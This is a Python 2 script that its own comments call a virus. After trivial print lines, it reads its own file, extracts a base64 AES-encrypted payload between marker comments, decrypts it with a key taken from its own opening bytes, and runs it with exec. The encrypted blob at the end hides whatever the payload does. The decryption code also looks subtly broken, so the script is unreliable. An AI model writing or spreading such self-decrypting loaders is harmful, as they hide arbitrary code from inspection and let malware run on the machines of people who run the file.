print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"



print "lolol"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload